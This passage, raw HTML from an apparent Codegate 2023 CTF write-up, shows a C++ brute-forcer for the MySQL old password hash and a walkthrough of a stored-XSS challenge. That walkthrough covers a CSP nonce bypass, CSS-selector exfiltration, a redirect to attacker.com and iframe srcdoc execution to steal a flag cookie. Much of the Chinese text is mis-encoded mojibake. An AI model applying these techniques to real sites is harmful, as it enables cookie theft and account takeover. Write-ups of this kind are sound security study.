class=\"line\">                *pnr = nr;</span><br><span class=\"line\">                *pnr2 = nr2;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">forward</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cc, <span class=\"type\">unsigned</span> len, <span class=\"type\">uint32_t</span> *nr, <span class=\"type\">uint32_t</span> *nr2, <span class=\"type\">uint32_t</span> *add)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> tmp;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; len; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (cc[i] == <span class=\"string\">&#x27; &#x27;</span> || cc[i] == <span class=\"string\">&#x27;\\t&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp = cc[i];</span><br><span class=\"line\">        *nr ^= (((*nr &amp; <span class=\"number\">63</span>) + *add) * tmp) + (*nr &lt;&lt; <span class=\"number\">8</span>);</span><br><span class=\"line\">        *nr2 += (*nr2 &lt;&lt; <span class=\"number\">8</span> ) ^ *nr;</span><br><span class=\"line\">        *add += tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> mask = (((<span class=\"type\">uint32_t</span>)<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">31</span>) - (<span class=\"type\">uint32_t</span>)<span class=\"number\">1</span>); <span class=\"comment\">// 111....11, 31bits</span></span><br><span class=\"line\">    *nr &amp;= mask;</span><br><span class=\"line\">    *nr2 &amp;= mask;</span><br><span class=\"line\">    <span class=\"comment\">// printf(&quot;hash: %x %x\\n&quot;, *nr, *nr2);</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">calc</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cc, <span class=\"type\">unsigned</span> len, <span class=\"type\">uint32_t</span> *nr, <span class=\"type\">uint32_t</span> *nr2)</span> </span>&#123;</span><br><span class=\"line\">\t*nr = <span class=\"number\">1345345333</span>;</span><br><span class=\"line\">\t*nr2 = <span class=\"number\">0x12345671</span>;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> add = <span class=\"number\">7</span>;</span><br><span class=\"line\">    forward(cc, len, nr, nr2, &amp;add);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Ans</span> &#123;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> buf[<span class=\"number\">6</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">pair_hash</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">template</span> &lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T1</span>, <span class=\"keyword\">class</span> <span class=\"title class_\">T2</span>&gt;</span><br><span class=\"line\">    <span class=\"function\">std::<span class=\"type\">size_t</span> <span class=\"title\">operator</span><span class=\"params\">()</span> <span class=\"params\">(<span class=\"type\">const</span> std::pair&lt;T1, T2&gt; &amp;pair)</span> <span class=\"type\">const</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> std::<span class=\"built_in\">hash</span>&lt;T1&gt;()(pair.first) ^ std::<span class=\"built_in\">hash</span>&lt;T2&gt;()(pair.second);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">bool</span> ok_maps[<span class=\"number\">65536</span>] = &#123;<span class=\"number\">0</span>&#125;; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> nr, nr2;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">char</span> cp[] = <span class=\"string\">&quot;codegate2023&#123;Mysql_olD_P455woRD_I5_CoMP_bEEE_KE03&quot;</span>;</span><br><span class=\"line\">    nr = <span class=\"number\">1345345333</span>;</span><br><span class=\"line\">\tnr2 = <span class=\"number\">0x12345671</span>;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> add = <span class=\"number\">7</span>;</span><br><span class=\"line\">    forward(cp, <span class=\"built_in\">strlen</span>((<span class=\"type\">char</span> *)cp), &amp;nr, &amp;nr2, &amp;add);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;nr: %x, nr2: %x, add: %x\\n&quot;</span>, nr, nr2, add);</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> fnr = nr, fnr2 = nr2, fadd = add;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> uadd = <span class=\"number\">127</span> * <span class=\"number\">6</span>, fuadd = fadd;</span><br><span class=\"line\">    fadd += uadd;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> cs[] = <span class=\"string\">&quot;i_love_you&#125;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    std::vector&lt;std::thread&gt; ths;</span><br><span class=\"line\">    std::mutex mtx;</span><br><span class=\"line\">    std::unordered_map&lt;std::pair&lt;<span class=\"type\">uint32_t</span>, <span class=\"type\">uint32_t</span>&gt;, Ans, pair_hash&gt; maps;</span><br><span class=\"line\">    std::atomic&lt;<span class=\"type\">int</span>&gt; cnter&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">500</span>; i &lt; <span class=\"number\">20000</span>; i++) &#123; <span class=\"comment\">// find possible `add` value </span></span><br><span class=\"line\">        <span class=\"type\">uint32_t</span> pnr = <span class=\"number\">0x63686163</span>, pnr2 = <span class=\"number\">0x68613230</span>;</span><br><span class=\"line\">        <span class=\"type\">int</span> ans = <span class=\"built_in\">oldpw_rev</span>(&amp;pnr, &amp;pnr2, i, cs, <span class=\"number\">11</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ans != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">        ok_maps[i] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">33</span>; i &lt; <span class=\"number\">127</span>; i++) &#123; </span><br><span class=\"line\">        ths.<span class=\"built_in\">emplace_back</span>([&amp;, i] &#123;</span><br><span class=\"line\">            std::vector&lt;std::pair&lt;std::pair&lt;<span class=\"type\">uint32_t</span>, <span class=\"type\">uint32_t</span>&gt;, Ans&gt;&gt; all;</span><br><span class=\"line\">            Ans cc;</span><br><span class=\"line\">            cc.buf[<span class=\"number\">5</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">            cc.buf[<span class=\"number\">4</span>] = i;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> c = <span class=\"number\">33</span>; c &lt; <span class=\"number\">127</span>; c++) &#123;</span><br><span class=\"line\">                cc.buf[<span class=\"number\">3</span>] = c;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> d = <span class=\"number\">33</span>; d &lt; <span class=\"number\">127</span>; d++) &#123;</span><br><span class=\"line\">                    cc.buf[<span class=\"number\">2</span>] = d;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> a = <span class=\"number\">33</span>; a &lt; <span class=\"number\">127</span>; a++) &#123;</span><br><span class=\"line\">                        <span class=\"type\">int</span> sumer = fadd + i + c + d + a + <span class=\"number\">1207</span>;</span><br><span class=\"line\">                        cc.buf[<span class=\"number\">1</span>] = a;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> b = <span class=\"number\">33</span>; b &lt; <span class=\"number\">127</span>; b++) <span class=\"keyword\">if</span> (ok_maps[sumer + b]) &#123;</span><br><span class=\"line\">                            cc.buf[<span class=\"number\">0</span>] = b;</span><br><span class=\"line\">                            <span class=\"type\">uint32_t</span> pnr = <span class=\"number\">0x63686163</span>, pnr2 = <span class=\"number\">0x68613230</span>;</span><br><span class=\"line\">                            <span class=\"type\">int</span> ans = <span class=\"built_in\">oldpw_rev</span>(&amp;pnr, &amp;pnr2, fadd + i + c + d + a + b + <span class=\"number\">1207</span>, cs, <span class=\"number\">11</span>); <span class=\"comment\">// backward: suffix</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (ans != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                            ans = <span class=\"built_in\">oldpw_rev</span>(&amp;pnr, &amp;pnr2, fadd + i + c + d + a + b, cc.buf, <span class=\"number\">5</span>); <span class=\"comment\">// ... and extra 5 steps</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (ans != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                            ++cnter; </span><br><span class=\"line\">                            all.<span class=\"built_in\">emplace_back</span>(std::<span class=\"built_in\">make_pair</span>(std::<span class=\"built_in\">make_pair</span>(pnr, pnr2), cc)); <span class=\"comment\">// possible nr/nr2 pair, record it</span></span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            std::lock_guard&lt;std::mutex&gt; <span class=\"built_in\">lock</span>(mtx);</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> &amp;&amp;p:all) &#123;</span><br><span class=\"line\">                maps[p.first] = p.second;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> &amp;&amp;th:ths) th.<span class=\"built_in\">join</span>();</span><br><span class=\"line\">    ths.<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;MITM&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, cnter.<span class=\"built_in\">load</span>());</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> i = <span class=\"number\">33</span>; i &lt; <span class=\"number\">127</span>; i++) &#123; <span class=\"comment\">// forward</span></span><br><span class=\"line\">        ths.<span class=\"built_in\">emplace_back</span>([&amp;, i] &#123;</span><br><span class=\"line\">            <span class=\"type\">unsigned</span> <span class=\"type\">char</span> buf[<span class=\"number\">50</span>];</span><br><span class=\"line\">            buf[<span class=\"number\">0</span>] = i;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> c = <span class=\"number\">33</span>; c &lt; <span class=\"number\">127</span>; c++) &#123;</span><br><span class=\"line\">                buf[<span class=\"number\">1</span>] = c;</span><br><span class=\"line\">                <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> d = <span class=\"number\">33</span>; d &lt; <span class=\"number\">127</span>; d++) &#123;</span><br><span class=\"line\">                    buf[<span class=\"number\">2</span>] = d;</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> a = <span class=\"number\">33</span>; a &lt; <span class=\"number\">127</span>; a++) &#123;</span><br><span class=\"line\">                        buf[<span class=\"number\">3</span>] = a;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> b = <span class=\"number\">33</span>; b &lt; <span class=\"number\">127</span>; b++) &#123;</span><br><span class=\"line\">                            buf[<span class=\"number\">4</span>] = b;</span><br><span class=\"line\">                            <span class=\"keyword\">for</span> (<span class=\"type\">size_t</span> e = <span class=\"number\">33</span>; e &lt; <span class=\"number\">127</span>; e++) &#123;</span><br><span class=\"line\">                                buf[<span class=\"number\">5</span>] = e;</span><br><span class=\"line\">                                <span class=\"type\">int</span> re = uadd - i - c - d - a - b - e;</span><br><span class=\"line\">                                <span class=\"type\">int</span> iter = <span class=\"number\">6</span>;</span><br><span class=\"line\">                                <span class=\"keyword\">while</span> (re &gt;= <span class=\"number\">33</span>) &#123; <span class=\"comment\">// padding, to make the `add` value is `fadd`</span></span><br><span class=\"line\">                                    <span class=\"type\">int</span> tw = re;</span><br><span class=\"line\">                                    <span class=\"keyword\">if</span> (re &gt; <span class=\"number\">126</span>) &#123;</span><br><span class=\"line\">                                        tw = <span class=\"string\">&#x27;a&#x27;</span>;</span><br><span class=\"line\">                                    &#125;</span><br><span class=\"line\">                                    buf[iter++] = tw;</span><br><span class=\"line\">                                    re -= tw;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (re != <span class=\"number\">0</span>) <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                                buf[iter] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                                <span class=\"type\">uint32_t</span> nr = fnr, nr2 = fnr2, add = fuadd;</span><br><span class=\"line\">                                forward(buf, iter, &amp;nr, &amp;nr2, &amp;add);</span><br><span class=\"line\">                                <span class=\"keyword\">auto</span> cc2 = std::<span class=\"built_in\">make_pair</span>(nr, nr2);</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (maps.<span class=\"built_in\">find</span>(cc2) != maps.<span class=\"built_in\">end</span>()) &#123; <span class=\"comment\">// GOT!!!</span></span><br><span class=\"line\">                                    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s%s%s%s\\n&quot;</span>, cp, buf, maps[cc2].buf, cs);</span><br><span class=\"line\">                                    <span class=\"comment\">// exit(0);</span></span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">auto</span> &amp;&amp;th:ths) th.<span class=\"built_in\">join</span>();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li>\n</ol>\n<h2 id=\"Chaâ€™s-Diary\"><a href=\"#Chaâ€™s-Diary\" class=\"headerlink\" title=\"Chaâ€™s Diary\"></a>Chaâ€™s Diary</h2><p>éé¢„æœŸäº†ã€‚<br>å‚¨å­˜å‹XSSï¼Œå…è®¸è·¨åŸŸã€‚<br>æœ‰CSPç­–ç•¥ä¿æŠ¤ï¼Œiframeè¢«ç¦æ­¢åŠ è½½ï¼Œéœ€è¦nonceæ¥æ‰§è¡Œè„šæœ¬ï¼š<br><code>&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#39;nonce-&lt;%= nonce %&gt;&#39;; frame-src &#39;none&#39;; object-src &#39;none&#39;; style-src &#39;unsafe-inline&#39; https://unpkg.com&quot;&gt;</code><br>ç›®æ ‡æ˜¯å·cookieé‡Œçš„flag.<br>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨metaæ ‡ç­¾è¿›è¡Œè·³è½¬ï¼š<br><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1; http://attacker.com&quot;&gt;</code><br>é‚£ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯ä¸¤æ­¥ï¼šè·å–nonceâ€”&gt;æ‰§è¡Œjs  </p>\n<h3 id=\"è·å–nonce\"><a href=\"#è·å–nonce\" class=\"headerlink\" title=\"è·å–nonce\"></a>è·å–nonce</h3><p>æ­£è§£åº”è¯¥æ˜¯é€šè¿‡æ³¨å…¥CSSï¼Œç”¨CSSåŒ¹é…å™¨åŒ¹é…nonceå±æ€§ï¼Œé€æ­¥è·å–nonceã€‚<br>å¯èƒ½æœ‰äººä¼šå¥½å¥‡ï¼Œæ¯æ¬¡é¡µé¢åˆ·æ–°ä¸æ˜¯ä¼šé‡æ–°ç”Ÿæˆnonceå—ï¼Ÿä½†æ­¤é¢˜æœ‰ä¸€ä¸ªç‰¹æ®Šä¹‹å¤„ï¼šä¼ å‚æ–¹æ³•æ˜¯é€šè¿‡URLçš„<code>#</code>é”šï¼ˆå“ˆå¸Œ&#x2F;frame&#x2F;â€¦ï¼‰æ¥ä¼ å‚ï¼Œå¹¶é€šè¿‡é¡µå†…jsåŠ¨æ€æ¸²æŸ“ã€‚å› æ­¤å½“å‰è¿›åé€€æ—¶å¹¶ä¸ä¼šåˆ·æ–°ï¼Œ<strong>è€Œæ˜¯è°ƒç”¨æµè§ˆå™¨ç¼“å­˜ã€‚å› æ­¤nonceä¸ä¼šæ”¹å˜</strong>ã€‚<br>å½“æ—¶ä»¥ä¸ºæœ‰<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/nonce#description\">nonce hiding</a>è¿™ç§ä¸œè¥¿ï¼Œæ‰€ä»¥æ²¡æœ‰å¾€ä¸‹å°è¯•ï¼Œç»“æœèµ›åå‘ç°è¿™ä¼¼ä¹æ˜¯ä¸ªé¥¼å¹¶æœªå®ç°â€¦â€¦å½“ç„¶ï¼Œæˆ‘ä»¬çš„åšæ³•æ˜¯ç›´æ¥åœ¨æ–°æ ‡ç­¾é¡µfetchå¹¶æ‹¿åˆ°é¡µé¢å†…å®¹æ­£åˆ™åŒ¹é…ï¼Œæ ¹æœ¬å°±ä¸ç»è¿‡æµè§ˆå™¨è¿‡æ»¤ã€‚<br>å®˜æ–¹çš„åšæ³•å°±æ˜¯ä½¿ç”¨CSSæ³¨å…¥æ¯æ¬¡å·ä¸€ä½ï¼Œå…·ä½“åšæ³•è§<a href=\"http://sirdarckcat.blogspot.com/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html\">how-to-bypass-csp-nonces-with-dom-xss</a><br>æ ¸å¿ƒéƒ¨åˆ†ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The summary of this attack is that it&#x27;s possible to create a CSS program that exfiltrates the values of HTML attributes character-by-character, simply by generating HTTP requests every time a CSS selector matches, and repeating consecutively. If you haven&#x27;t seen this working, take a look here. The way it works is very simple, it just creates a CSS attribute selector of the form:</span><br><span class=\"line\"></span><br><span class=\"line\">*[attribute^=&quot;a&quot;]&#123;background:url(&quot;record?match=a&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;b&quot;]&#123;background:url(&quot;record?match=b&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;c&quot;]&#123;background:url(&quot;record?match=c&quot;)&#125;</span><br><span class=\"line\">[...]</span><br><span class=\"line\"></span><br><span class=\"line\">And then, once we get a match, repeat with:</span><br><span class=\"line\">*[attribute^=&quot;aa&quot;]&#123;background:url(&quot;record?match=aa&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;ab&quot;]&#123;background:url(&quot;record?match=ab&quot;)&#125;</span><br><span class=\"line\">*[attribute^=&quot;ac&quot;]&#123;background:url(&quot;record?match=ac&quot;)&#125;</span><br><span class=\"line\">[...]</span><br><span class=\"line\"></span><br><span class=\"line\">Until it exfiltrates the complete attribute.</span><br></pre></td></tr></table></figure>\n<p>ç„¶è€Œæˆ‘ä»¬å‘ç°ä»–åªä½¿ç”¨äº†<code>Math.random</code>æ¥ç”Ÿæˆéšæœºnonceï¼Œè¿™å®Œå…¨æ˜¯å¯ä»¥é¢„æµ‹çš„ï¼š<a href=\"https://github.com/PwnFunction/v8-randomness-predictor\">https://github.com/PwnFunction/v8-randomness-predictor</a><br><strong>äºæ˜¯æˆ‘ä»¬æ–°å¼€ä¸€ä¸ªæ ‡ç­¾é¡µç„¶åå¤šæ¬¡fetché˜…è¯»æ–‡ç« é¡µé¢æ‹¿ä¸€å †nonceç»™é¢„æµ‹å™¨ï¼Œç›´æ¥å°±èƒ½çŸ¥é“ä¸‹ä¸€ä¸ªnonce.</strong>  </p>\n<h3 id=\"æ‰§è¡ŒJS\"><a href=\"#æ‰§è¡ŒJS\" class=\"headerlink\" title=\"æ‰§è¡ŒJS\"></a>æ‰§è¡ŒJS</h3><p>nonceå·²çŸ¥ä¹‹åå¯ä»¥ç›´æ¥åœ¨è‡ªå·±VPSä¸Šå‘é€è¯·æ±‚åˆ›å»ºç¬”è®°ã€‚<br>æ¥ä¸‹æ¥è¦è®©å—å®³è€…åŠ è½½é¡µé¢æ‰è¡Œã€‚è¿™ä¸ªåªéœ€è¦çœ‹<code>share_read.js</code>å°±ä¼šå‘ç°è§¦å‘<code>hashchange</code>äº‹ä»¶å³å¯ã€‚ç”±äºç¼“å­˜ï¼ˆå‰è¿›åé€€ç¼“å­˜ï¼Œbfcacheï¼‰çš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å·²çŸ¥nonceçš„æ ‡ç­¾é¡µéšä¾¿å¼€ä¸ªé¡µé¢ç„¶å<code>extra.history.go(-1);</code>ï¼Œå¹¶ä¿®æ”¹hashå€¼ä¾¿èƒ½å†æ¬¡è§¦å‘poståŠ è½½ï¼Œè®©å·²ç»è¢«å›è°ƒå‡½æ•°åˆ æ‰çš„äº‹ä»¶ç›‘å¬å™¨åœ¨é‡æ–°è¿è¡Œçš„jsä¸­ç„•å‘ç¬¬äºŒæ˜¥ã€‚<br>è¿™æ—¶æˆ‘ä»¬å‘ç°å•çº¯æ’å…¥scriptæ ‡ç­¾å¹¶ä¸èƒ½è¢«æ‰§è¡Œï¼Œå› ä¸ºjsè„šæœ¬æ˜¯å¾€é¡µé¢DOMèŠ‚ç‚¹å†™å…¥<code>innerText</code>è€Œå·²ã€‚<br>ç»è¿‡ä¸€ç•ªç¥ç§˜çš„æ‘¸ç´¢ï¼Œå¤§æˆ˜MDNçš„manualï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªç¥å¥‡çš„å±æ€§ï¼š<code>&lt;iframe srcdoc=&quot;...&quot;&gt;</code><br>åœ¨<a href=\"https://csplite.com/csp/test188/\">CSPæµ‹è¯•ç½‘ç«™</a>ä¸­æ˜¯è¿™ä¹ˆè¯´çš„ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content Security Policy: the srcdoc attribute in the iframe tag is not governed by frame-src, but its content is blocked by other directives of the parent page</span><br></pre></td></tr></table></figure>\n\n<p>ä¹Ÿå°±æ˜¯æ’å…¥æ—¶å°±ä¼šæ‰§è¡Œã€‚è‡³æ­¤ï¼Œæˆ‘ä»¬å¾—ä»¥æ‰§è¡Œæ’å…¥çš„jsä»£ç ã€‚  </p>\n<h3 id=\"å¤‡æ³¨\"><a href=\"#å¤‡æ³¨\" class=\"headerlink\" title=\"å¤‡æ³¨\"></a>å¤‡æ³¨</h3><p>å®˜æ–¹ideaæ¥è‡ªè¿™ç¯‡æ–‡ç« ï¼Œä¹Ÿæ˜¯åœºä¸Šæ‰¾åˆ°è¿‡çš„ææ–™ï¼š<a href=\"https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss\">Chrome Cache to XSS</a><br>å…¶ä»–ä¸€äº›å¾ˆæœ‰ç”¨çš„ææ–™ï¼š<a href=\"http://sebastian-lekies.de/csp/bypasses.php\">Collection of CSP bypasses</a><br>CSPç›¸å…³æµ‹è¯•çš„ç½‘ç«™ï¼š<a href=\"https://csplite.com/csp/\">https://csplite.com/csp/</a><br>éšæœºæ•°é¢„æµ‹è§£æ³•çš„å®Œæ•´æœåŠ¡ç«¯ä»£ç ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span 